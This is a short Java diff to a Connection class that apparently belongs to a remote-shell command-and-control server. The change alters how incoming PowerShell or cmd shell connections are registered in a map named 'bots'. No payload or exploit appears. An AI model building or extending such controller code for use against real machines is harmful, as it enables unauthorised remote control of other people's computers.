@@ -21,7 +21,7 @@ public class Connection {
     //private int numberOfBlockedMsg = -1;
     private boolean saveOutput;
     private SystemType.type systemType = SystemType.type.Windows;
-    private ShellType.type shellType;
+    private ShellType.type shellType = null;
 
     public Connection(ChannelHandlerContext ctx, int id, boolean saveOutput) throws IOException {
         this.ctx = ctx;
@@ -38,17 +38,20 @@ public class Connection {
     }
 
     public void write(String msg) {
-        alive = true;
 
         if(shellType == null){
             if(msg.charAt(0) == 'p'){
                 shellType = ShellType.type.powershell;
+                Data.bots.put(ctx.channel().remoteAddress().toString(), this);
+                //System.out.println("added");
             }else if(msg.charAt(0) == 'c'){
                 shellType = ShellType.type.cmd;
+                Data.bots.put(ctx.channel().remoteAddress().toString(), this);
+                //System.out.println("added");
             }else{
-                shellType = ShellType.type.Undefined;
+                //shellType = ShellType.type.Undefined;
             }
-            Data.bots.put(ctx.channel().remoteAddress().toString(), this);
+
         }
 
         /*if (blockOutput) {
